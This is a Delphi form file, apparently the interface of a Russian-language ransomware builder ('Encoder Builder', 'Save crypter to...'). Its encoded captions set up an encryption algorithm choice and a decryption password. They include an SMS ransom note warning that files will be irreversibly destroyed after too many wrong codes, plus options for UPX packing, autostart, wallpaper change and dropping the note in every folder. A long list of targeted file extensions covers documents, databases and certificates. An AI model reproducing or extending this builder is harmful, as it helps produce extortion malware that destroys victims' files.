object Form1: TForm1
  Left = 0
  Top = 0
  BorderIcons = [biSystemMenu]
  BorderStyle = bsToolWindow
  Caption = 'Encoder Builder v2.4 by [VaZoNeZ.CoM]'
  ClientHeight = 569
  ClientWidth = 393
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  Position = poDesktopCenter
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object Button3: TButton
    Left = 8
    Top = 536
    Width = 377
    Height = 25
    Caption = #1057#1086#1079#1076#1072#1090#1100'!'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -11
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentFont = False
    TabOrder = 0
    OnClick = Button3Click
  end
  object GroupBox1: TGroupBox
    Left = 253
    Top = 224
    Width = 132
    Height = 54
    Caption = #1040#1083#1075#1086#1088#1080#1090#1084' '#1096#1080#1092#1088#1086#1074#1072#1085#1080#1103
    TabOrder = 2
    object RadioButton1: TRadioButton
      Left = 8
      Top = 16
      Width = 57
      Height = 17
      Caption = 'XOR'
      TabOrder = 0
    end
    object RadioButton2: TRadioButton
      Left = 8
      Top = 32
      Width = 57
      Height = 17
      Caption = 'TEA'
      Checked = True
      TabOrder = 1
      TabStop = True
    end
  end
  object GroupBox2: TGroupBox
    Left = 8
    Top = 280
    Width = 185
    Height = 58
    Caption = #1057#1086#1086#1073#1097#1077#1085#1080#1077
    TabOrder = 6
    object RadioButton3: TRadioButton
      Left = 8
      Top = 16
      Width = 145
      Height = 17
      Caption = #1041#1077#1079' '#1089#1086#1086#1073#1097#1077#1085#1080#1103' - '#1089#1082#1088#1099#1090#1086
      TabOrder = 0
    end
    object RadioButton4: TRadioButton
      Left = 8
      Top = 36
      Width = 137
      Height = 17
      Caption = #1057' '#1087#1086#1082#1072#1079#1086#1084' '#1089#1086#1086#1073#1097#1077#1085#1080#1103
      Checked = True
      TabOrder = 1
      TabStop = True
    end
  end
  object GroupBox3: TGroupBox
    Left = 8
    Top = 340
    Width = 225
    Height = 50
    Caption = #1055#1072#1088#1086#1083#1100' '#1076#1083#1103' '#1088#1072#1089#1096#1080#1092#1088#1086#1074#1082#1080
    TabOrder = 1
    object Button5: TButton
      Left = 164
      Top = 20
      Width = 53
      Height = 21
      Caption = 'RND!'
      TabOrder = 1
      OnClick = Button5Click
    end
    object Edit2: TEdit
      Left = 8
      Top = 20
      Width = 153
      Height = 21
      MaxLength = 256
      TabOrder = 0
      Text = '123'
    end
  end
  object GroupBox4: TGroupBox
    Left = 8
    Top = 4
    Width = 377
    Height = 169
    Caption = #1058#1077#1082#1089#1090' '#1089#1086#1086#1073#1097#1077#1085#1080#1103
    TabOrder = 3
    object Memo1: TMemo
      Left = 10
      Top = 20
      Width = 357
      Height = 139
      Lines.Strings = (
        #1042#1085#1080#1084#1072#1085#1080#1077'! '#1042#1089#1077' '#1042#1072#1096#1080' '#1092#1072#1081#1083#1099' '#1079#1072#1096#1080#1092#1088#1086#1074#1072#1085#1099'!'
        #1063#1090#1086#1073#1099' '#1074#1086#1089#1089#1090#1072#1085#1086#1074#1080#1090#1100' '#1089#1074#1086#1080' '#1092#1072#1081#1083#1099' '#1080' '#1087#1086#1083#1091#1095#1080#1090#1100' '#1082' '#1085#1080#1084' '#1076#1086#1089#1090#1091#1087', '
        #1086#1090#1087#1088#1072#1074#1100#1090#1077' '#1089#1084#1089' '#1089' '#1090#1077#1082#1089#1090#1086#1084' XXXX '#1085#1072' '#1085#1086#1084#1077#1088' YYYY'
        ''
        #1059' '#1074#1072#1089' '#1077#1089#1090#1100' N '#1087#1086#1087#1099#1090#1086#1082' '#1074#1074#1086#1076#1072' '#1082#1086#1076#1072'. '#1055#1088#1080' '#1087#1088#1077#1074#1099#1096#1077#1085#1080#1080' '#1101#1090#1086#1075#1086' '
        #1082#1086#1083#1080#1095#1077#1089#1090#1074#1072', '#1074#1089#1077' '#1076#1072#1085#1085#1099#1077' '#1085#1077#1086#1073#1088#1072#1090#1080#1084#1086' '#1080#1089#1087#1086#1088#1090#1103#1090#1089#1103'. '#1041#1091#1076#1100#1090#1077' '
        #1074#1085#1080#1084#1072#1090#1077#1083#1100#1085#1099' '#1087#1088#1080' '#1074#1074#1086#1076#1077' '#1082#1086#1076#1072'!')
      MaxLength = 1024
      TabOrder = 0
    end
  end
  object GroupBox6: TGroupBox
    Left = 8
    Top = 174
    Width = 239
    Height = 104
    Caption = #1052#1072#1089#1082#1080' '#1087#1086#1080#1089#1082#1072
    TabOrder = 5
    object ListBox1: TListBox
      Left = 8
      Top = 20
      Width = 81
      Height = 75
      ItemHeight = 13
      Items.Strings = (
        '*.zip'
        '*.rar'
        '*.7z'
        '*.tar'
        '*.gzip'
        '*.jpg'
        '*.jpeg'
        '*.psd'
        '*.cdr'
        '*.dwg'
        '*.max'
        '*.bmp'
        '*.gif'
        '*.png'
        '*.doc'
        '*.docx'
        '*.xls'
        '*.xlsx'
        '*.ppt'
        '*.pptx'
        '*.txt'
        '*.pdf'
        '*.djvu'
        '*.htm'
        '*.html'
        '*.mdb'
        '*.cer'
        '*.p12'
        '*.pfx'
        '*.kwm'
        '*.pwm'
        '*.1cd'
        '*.md'
        '*.mdf'
        '*.dbf'
        '*.odt'
        '*.vob'
        '*.ifo'
        '*.lnk'
        '*.torrent'
        '*.mov'
        '*.m2v'
        '*.3gp'
        '*.mpeg'
        '*.mpg'
        '*.flv'
        '*.avi'
        '*.mp4'
        '*.wmv'
        '*.divx'
        '*.mkv'
        '*.mp3'
        '*.wav'
        '*.flac'
        '*.ape'
        '*.wma'
        '*.ac3')
      TabOrder = 0
    end
    object Edit1: TEdit
      Left = 96
      Top = 20
      Width = 134
      Height = 21
      TabOrder = 4
      Text = '*.nnn'
    end
    object Button1: TButton
      Left = 96
      Top = 48
      Width = 65
      Height = 21
      Caption = '+'
      TabOrder = 2
      OnClick = Button1Click
    end
    object Button2: TButton
      Left = 168
      Top = 74
      Width = 62
      Height = 21
      Caption = #1054#1095#1080#1089#1090#1080#1090#1100
      TabOrder = 3
      OnClick = Button2Click
    end
    object Button4: TButton
      Left = 96
      Top = 74
      Width = 65
      Height = 21
      Caption = #1042#1089#1090#1072#1074#1080#1090#1100
      TabOrder = 5
      OnClick = Button4Click
    end
    object Button8: TButton
      Left = 168
      Top = 48
      Width = 62
      Height = 21
      Caption = #8212
      TabOrder = 1
      OnClick = Button8Click
    end
  end
  object Memo2: TMemo
    Left = 152
    Top = 40
    Width = 30
    Height = 30
    Enabled = False
    Lines.Strings = (
      'M')
    TabOrder = 4
    Visible = False
    WordWrap = False
  end
  object GroupBox7: TGroupBox
    Left = 200
    Top = 280
    Width = 185
    Height = 58
    Caption = #1071#1079#1099#1082' '#1080#1085#1090#1077#1088#1092#1077#1081#1089#1072
    TabOrder = 7
    object ComboBox1: TComboBox
      Left = 12
      Top = 24
      Width = 160
      Height = 22
      Style = csOwnerDrawFixed
      ItemHeight = 16
      ItemIndex = 1
      TabOrder = 0
      Text = #1056#1091#1089#1089#1082#1080#1081
      Items.Strings = (
        #1040#1085#1075#1083#1080#1081#1089#1082#1080#1081
        #1056#1091#1089#1089#1082#1080#1081)
    end
  end
  object GroupBox9: TGroupBox
    Left = 253
    Top = 174
    Width = 132
    Height = 50
    Caption = #1055#1086#1087#1099#1090#1086#1082' '#1074#1074#1086#1076#1072' '#1087#1072#1088#1086#1083#1103
    TabOrder = 8
    object Label1: TLabel
      Left = 112
      Top = 22
      Width = 7
      Height = 16
      Caption = '?'
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clRed
      Font.Height = -13
      Font.Name = 'Tahoma'
      Font.Style = [fsBold]
      ParentFont = False
      OnClick = Label1Click
    end
    object SpinEdit1: TSpinEdit
      Left = 8
      Top = 20
      Width = 94
      Height = 22
      MaxValue = 0
      MinValue = 0
      TabOrder = 0
      Value = 5
    end
  end
  object GroupBox10: TGroupBox
    Left = 240
    Top = 340
    Width = 145
    Height = 50
    Caption = #1056#1072#1089#1096#1080#1088#1077#1085#1080#1077' '#1092#1072#1081#1083#1086#1074
    TabOrder = 9
    object Edit4: TEdit
      Left = 8
      Top = 20
      Width = 129
      Height = 21
      TabOrder = 0
      Text = 'EnCiPhErEd'
    end
  end
  object Edit3: TEdit
    Left = 128
    Top = 424
    Width = 180
    Height = 21
    Enabled = False
    ReadOnly = True
    TabOrder = 10
  end
  object Button6: TButton
    Left = 316
    Top = 424
    Width = 68
    Height = 21
    Caption = '...'
    Enabled = False
    TabOrder = 11
    OnClick = Button6Click
  end
  object CheckBox2: TCheckBox
    Left = 8
    Top = 426
    Width = 97
    Height = 17
    Caption = #1052#1077#1085#1103#1090#1100' '#1080#1082#1086#1085#1082#1091
    TabOrder = 12
    OnClick = CheckBox2Click
  end
  object CheckBox1: TCheckBox
    Left = 8
    Top = 398
    Width = 89
    Height = 17
    Caption = #1052#1077#1085#1103#1090#1100' '#1086#1073#1086#1080
    TabOrder = 13
    OnClick = CheckBox1Click
  end
  object Edit5: TEdit
    Left = 128
    Top = 396
    Width = 180
    Height = 21
    Enabled = False
    ReadOnly = True
    TabOrder = 14
  end
  object Button7: TButton
    Left = 316
    Top = 396
    Width = 68
    Height = 21
    Caption = '...'
    Enabled = False
    TabOrder = 15
    OnClick = Button7Click
  end
  object CheckBox3: TCheckBox
    Left = 8
    Top = 454
    Width = 161
    Height = 17
    Caption = #1059#1087#1072#1082#1086#1074#1099#1074#1072#1090#1100' '#1073#1080#1083#1076' UPX'#39#1086#1084
    Checked = True
    State = cbChecked
    TabOrder = 16
  end
  object CheckBox4: TCheckBox
    Left = 8
    Top = 482
    Width = 257
    Height = 17
    Caption = #1050#1086#1087#1080#1088#1086#1074#1072#1090#1100' TXT-'#1092#1072#1081#1083' '#1089' '#1080#1085#1092#1086#1081' '#1074#1086' '#1074#1089#1077' '#1087#1072#1087#1082#1080
    Checked = True
    State = cbChecked
    TabOrder = 17
  end
  object CheckBox5: TCheckBox
    Left = 8
    Top = 510
    Width = 193
    Height = 17
    Caption = #1044#1086#1073#1072#1074#1083#1103#1090#1100' '#1073#1080#1083#1076' '#1074' '#1072#1074#1090#1086#1079#1072#1075#1088#1091#1079#1082#1091
    Checked = True
    State = cbChecked
    TabOrder = 18
  end
  object XPManifest1: TXPManifest
    Left = 24
    Top = 40
  end
  object OpenPictureDialog2: TOpenPictureDialog
    Filter = 'Icons (*.ico)|*.ico|'#1042#1089#1077' '#1092#1072#1081#1083#1099'|*.*'
    Options = [ofHideReadOnly, ofPathMustExist, ofFileMustExist, ofEnableSizing]
    Title = #1042#1099#1073#1077#1088#1080#1090#1077' '#1080#1082#1086#1085#1082#1091
    Left = 88
    Top = 40
  end
  object SaveDialog1: TSaveDialog
    Filter = 'EXE|*.exe'
    Title = 'Save crypter to...'
    Left = 120
    Top = 40
  end
  object OpenPictureDialog1: TOpenPictureDialog
    Filter = 'Bitmaps (*.bmp)|*.bmp|'#1042#1089#1077' '#1092#1072#1081#1083#1099'|*.*'
    Title = #1042#1099#1073#1077#1088#1080#1090#1077' '#1080#1079#1086#1073#1088#1072#1078#1077#1085#1080#1077' '#1088#1072#1073#1086#1095#1077#1075#1086' '#1089#1090#1086#1083#1072
    Left = 88
    Top = 72
  end
end
